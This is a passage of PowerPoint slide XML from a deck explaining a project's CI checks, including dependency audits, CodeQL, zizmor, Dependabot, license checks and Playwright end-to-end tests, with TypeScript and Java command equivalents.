                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="777240">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="D7261E"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Dependency audit</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Compares our library versions with known vulnerabilities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Never ship a library with a known security hole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Vulnerable packages with CVE id and severity</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Is any of my toys on the recall list?</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="777240">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1">
                          <a:solidFill>
                            <a:srgbClr val="6E3CBE"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CodeQL (SAST)</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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Follows how data flows through our own code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Find security bugs we wrote ourselves (injection...)</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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Alerts in the Security tab (SARIF)</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Can a stranger open our front door?</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="777240">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="26AF72"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>zizmor</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A linter for the GitHub Actions workflow files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The robot that builds our code cannot be tricked</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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Annotations on the PR; job fails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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>The babysitter only gets the keys they need</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="777240">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1">
                          <a:solidFill>
                            <a:srgbClr val="0A9BCD"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Dependabot</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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>A bot that opens PRs to update libraries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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Keep libraries fresh so known holes get fixed</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a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Pull requests (version + security updates)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i="1">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>A helper who swaps old batteries for new ones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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="777240">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F5B400"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>License (OSS) check</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Lists every library's license and applies our policy</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Only use libraries we are allowed to ship</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CSV: Passed / Restrictive / Fail per package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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Some toys say "share me", some say "give me back"</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Same checks, two ecosystems</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If you know the TypeScript tool, here is its Java counterpart</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1088731819"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="1508760"/>
          <a:ext cx="11091672" cy="4041648"/>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782312">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="420624">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Check</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="13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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TypeScript (pnpm)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="13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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Java (Maven)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Format check</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Prettier</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pnpm format:check</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Spotless + google-java-format</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./mvnw spotless:check</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Lint</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ESLint + typescript-eslint (strict)</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pnpm lint</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Checkstyle (style) + SpotBugs (bugs)</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./mvnw compile checkstyle:check spotbugs:check</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Typecheck</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TypeScript compiler</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pnpm typecheck  →  tsc --noEmit</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>javac with warnings as errors</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./mvnw test-compile  (-Xlint:all -Werror)</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unit test + coverage</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vitest + V8 coverage, 80% gate</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pnpm test:coverage</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>JUnit + AssertJ + JaCoCo, 80% gate</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./mvnw verify</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Dependency audit</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>pnpm audit (fails on high+)</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pnpm audit --audit-level high</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OSV-Scanner on a CycloneDX SBOM</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osv-scanner scan source -L bom.cdx.json</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5"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>End-to-end test</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="000000"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>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marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Playwright (headless Chromium)</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4A4A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>pnpm e2e  ·  pnpm e2e:ui</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1150" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="4A4A4A"/>
                        </a:solidFill>
                        <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>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tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Playwright for Java + JUnit</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="it-IT" sz="1150" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4A4A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>./mvnw -Pe2e test  ·  -Pe2e,e2e-ui</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1150" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="4A4A4A"/>
                        </a:solidFill>
                        <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>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F7F7"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3884604291"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Tool version pin</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>packageManager field</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"packageManager": "pnpm@11.21.0"</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100"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Maven Wrapper</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4A4A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>./mvnw  →  Maven 3.9.16</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="13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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>End-to-end tests with Playwright</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a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A real browser uses the app like a customer: one test suite, two ways to run it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="566928" cy="566928"/>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6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1517904"/>
            <a:ext cx="4663440" cy="6400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800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Non-interactive: pnpm e2e</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Headless and scripted, exactly what CI runs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="5394960" cy="251460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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ts-ci.yml: e2e job</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>e2e</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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: E2E test (Playwright)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steps</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: $/.github/actions/setup-ts</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: pnpm e2e:install   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># Chromium + libs</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="7CC7FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
